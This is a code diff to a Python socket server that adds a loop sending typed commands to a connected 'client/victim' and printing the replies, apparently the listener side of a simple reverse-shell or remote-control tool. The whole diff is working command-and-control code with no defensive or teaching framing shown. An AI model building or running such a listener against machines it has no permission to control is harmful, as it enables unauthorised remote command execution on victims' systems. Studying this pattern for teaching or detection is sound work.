@@ -32,3 +32,21 @@ def socket_accept():
     print("Connection has been established | " + "IP: " + address[0] + " | Port " + str(address[1])) # Print IP and port
     send_commands(conn) # Send commands
     conn.close() # Close connection
+
+# Send commands to client/victim or a friend
+def send_commands(conn):
+    while True:
+        cmd = input() # Take input
+        if cmd == "quit": # If input is quit, close connection
+            conn.close() # Closes connection
+            s.close() # Closes socket
+            sys.exit() # Exits program
+        if len(str.encode(cmd)) > 0: # If there is a command
+            conn.send(str.encode(cmd)) # Send command
+            client_response = str(conn.recv(1024), "utf-8") # Receive response
+            print(client_response, end="") # Print response
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
